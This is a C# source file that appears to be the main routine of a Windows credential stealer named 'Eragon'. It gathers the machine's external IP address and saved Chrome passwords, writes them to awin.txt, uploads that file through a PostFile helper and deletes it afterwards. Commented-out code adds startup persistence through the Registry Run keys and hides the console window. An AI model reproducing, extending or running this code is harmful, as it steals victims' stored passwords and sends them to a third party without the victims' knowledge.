﻿using System;
using System.Security.Permissions;
using Microsoft.Win32;
using System.Runtime.InteropServices;
//using System.Reflection;
using System.IO;
using System.Net;
using System.Text.RegularExpressions;

namespace Eragon
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;


        static Chrome chrome_ = new Chrome();
        static datetime DT = new datetime();
        


        static void Main(string[] args)
        {
          
            var handle = GetConsoleWindow();

            // Hide
          //  ShowWindow(handle, SW_HIDE);
            // Show
             ShowWindow(handle, SW_SHOW);


//Remove comment from the below code to register program as start up applictaion
            /*    string codeBase = Assembly.GetExecutingAssembly().Location;
                string name = Path.GetFileNameWithoutExtension(codeBase);
            */
            // RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            //  rkApp.SetValue(name, codeBase);


            /*     Console.WriteLine(codeBase);
             *  
             *  RegistryKey rk;
               try
               {
                   rk = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
                   rk.SetValue(name, codeBase);
                 //  return true;
               }
               catch (Exception)
               {
               }

               try
               {
                   rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
                   rk.SetValue(name, codeBase);
               }
               catch (Exception ex)
               {
                   Console.WriteLine(ex.ToString());
               }

               */
            // Console.Write(chrome_.GetChromePass());
            Console.WriteLine("date-time");
            Console.WriteLine(DT.showDate());
            Console.WriteLine("IP: "+getExternalIp());

            string res = "IP: " + getExternalIp() + "\n" + "Date: " + DT.showDate() + "\n" + chrome_.GetChromePass();
            //write to awin.txt
            using (StreamWriter writer = new StreamWriter("awin.txt", false))
            {
                writer.Write(res);
            }

            //postfile
            PostFile PostPass = new PostFile();
            
            PostPass.updateDesignpageClient("awin.txt");


            //delete
            try
            {
                File.Delete("awin.txt");
            }
            catch
            {
                Console.WriteLine("could not delete");
                // Well.. don't know what happened here and I don't care..
                // Some tweaking tools will clean this folder at some point..
            }
            
        }

        private static string getExternalIp()
        {
            try
            {
                string externalIP;
                externalIP = (new WebClient()).DownloadString("http://checkip.dyndns.org/");
                externalIP = (new Regex(@"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}"))
                             .Matches(externalIP)[0].ToString();
                return externalIP;
            }
            catch { return null; }
        }
    }
}
